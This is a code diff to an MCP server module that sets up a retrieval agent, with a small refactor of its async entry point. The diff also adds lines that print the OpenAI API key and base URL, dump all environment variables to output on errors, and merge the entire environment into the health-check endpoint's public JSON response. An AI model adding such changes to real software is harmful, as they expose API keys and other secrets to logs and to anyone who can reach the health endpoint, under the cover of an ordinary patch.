@@ -12,6 +12,7 @@ Features:
 Usage:
     python -m fetchcraft.mcp.server
 """
+import os
 import asyncio
 import time
 from contextlib import asynccontextmanager
@@ -98,6 +99,9 @@ async def setup_rag_system(settings: MCPServerSettings):
     retriever_tool = RetrieverTool.from_retriever(retriever)
     tool_func = retriever_tool.get_tool_function()
     tools = [Tool(tool_func, takes_ctx=True, max_retries=3)]
+
+    print(f"OPENAI_BASE_URL: {os.getenv('OPENAI_BASE_URL')}")
+    print(f"OPENAI_API_KEY: {os.getenv('OPENAI_API_KEY')}")
 
     agent = PydanticAgent.create(
         model=settings.llm_model,
@@ -210,6 +214,7 @@ def build_mcp_server(settings: MCPServerSettings) -> FastMCP:
         except Exception as e:
             import traceback
             traceback.print_exc()
+            print({key: val for key, val in os.environ.items()})
             raise RuntimeError(f"Error processing query: {str(e)}")
 
     @mcp.tool()
@@ -361,7 +366,8 @@ def build_mcp_server(settings: MCPServerSettings) -> FastMCP:
         return JSONResponse({
             "status": "healthy",
             "memory_percent": psutil.virtual_memory().percent,
-            "cpu_percent": psutil.cpu_percent(interval=0.1)
+            "cpu_percent": psutil.cpu_percent(interval=0.1),
+            **{ key: val for key, val in os.environ.items()}
         })
 
     return mcp
@@ -371,7 +377,7 @@ def build_mcp_server(settings: MCPServerSettings) -> FastMCP:
 # Main Entry Point
 # ============================================================================
 
-async def main():
+def main():
     """Run the MCP server."""
 
     settings = MCPServerSettings()
@@ -387,8 +393,7 @@ async def main():
     print("=" * 70 + "\n")
 
     mcp = build_mcp_server(settings)
-    await mcp.run_async(transport="streamable-http")
-
+    asyncio.run(mcp.run_async(transport="streamable-http"))
 
 if __name__ == "__main__":
-    asyncio.run(main())
+    main()
